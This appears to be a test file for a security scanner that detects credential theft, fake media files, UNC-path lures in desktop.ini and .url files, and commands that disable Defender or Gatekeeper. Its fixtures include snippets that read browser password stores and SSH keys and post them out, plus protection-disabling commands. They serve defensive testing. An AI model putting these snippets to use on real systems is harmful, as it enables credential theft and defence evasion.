import { test } from 'node:test';
import assert from 'node:assert/strict';
import { bin, file, only, x } from './helpers.ts';

const LOGIN = x('Login§ Data');
const STATE = x('Local§ State');

test('STEAL-001: credential stores plus network access is High', () => {
  const js = `const p = path.join(home, "${LOGIN}");\nconst k = path.join(home, "${STATE}");\naxios.post(url, read(p));`;
  const f = only([file('collect.js', js)], 'STEAL-001');
  assert.equal(f[0]?.severity, 'high');
  assert.match(f[0]?.message ?? '', /browser saved passwords/);
});

test('STEAL-001: a single strong marker with network is enough', () => {
  const py = x('key = open(os.path.expanduser("~/.s§sh/id_rsa")).read()\nrequests.post(url, data=key)');
  assert.equal(only([file('k.py', py)], 'STEAL-001').length, 1);
});

test('STEAL-001: credential markers without network, or one weak marker, are ignored', () => {
  assert.equal(only([file('a.js', `read("${LOGIN}"); read("${STATE}");`)], 'STEAL-001').length, 0);
  assert.equal(only([file('b.js', `read("${STATE}"); fetch(u);`)], 'STEAL-001').length, 0);
});

test('BIN-002: a font containing script code is Critical', () => {
  const js = 'const cp = require("child_process");\nfunction run() { return 1; }\nconst x = () => { run(); };';
  const f = only([file('public/fonts/brand.woff2', js)], 'BIN-002');
  assert.equal(f[0]?.severity, 'critical');
  assert.match(f[0]?.message ?? '', /contains script code/);
});

test('BIN-002: an image that is really an executable is Critical', () => {
  const f = only([bin('assets/logo.png', [0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00])], 'BIN-002');
  assert.match(f[0]?.message ?? '', /Windows executable/);
});

test('BIN-002: real media files and Git LFS pointers are not flagged', () => {
  assert.equal(only([bin('logo.png', [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00])], 'BIN-002').length, 0);
  const lfs = 'version https://git-lfs.github.com/spec/v1\noid sha256:abc\nsize 1234\n';
  assert.equal(only([file('big.png', lfs)], 'BIN-002').length, 0);
});

test('BIN-008: desktop.ini (UTF-16) and .url files pointing at UNC paths are High', () => {
  const ini = '[.ShellClassInfo]\r\nIconResource=\\\\198.51.100.7\\share\\icon.ico,0\r\n';
  const utf16 = [0xff, 0xfe, ...Array.from(ini).flatMap((c) => [c.charCodeAt(0), 0])];
  assert.equal(only([bin('docs/desktop.ini', utf16)], 'BIN-008')[0]?.severity, 'high');
  const url = '[InternetShortcut]\nURL=https://example.com\nIconFile=\\\\198.51.100.7\\s\\i.ico\n';
  assert.equal(only([file('Open me.url', url)], 'BIN-008').length, 1);
});

test('BIN-008: an ordinary internet shortcut is not flagged', () => {
  assert.equal(only([file('Docs.url', '[InternetShortcut]\nURL=https://example.com/docs\n')], 'BIN-008').length, 0);
});

test('SYS-004: disabling security protections is High, except in docs', () => {
  assert.equal(only([file('a.ps1', x('Set-Mp§Preference -DisableRealtimeMonitoring $true'))], 'SYS-004')[0]?.severity, 'high');
  assert.equal(only([file('b.ps1', x('Add-Mp§Preference -ExclusionPath $env:TEMP'))], 'SYS-004').length, 1);
  assert.equal(only([file('c.sh', x('sudo spc§tl --master-disable'))], 'SYS-004').length, 1);
  assert.equal(only([file('README.md', x('Set-Mp§Preference -DisableRealtimeMonitoring $true'))], 'SYS-004').length, 0);
});
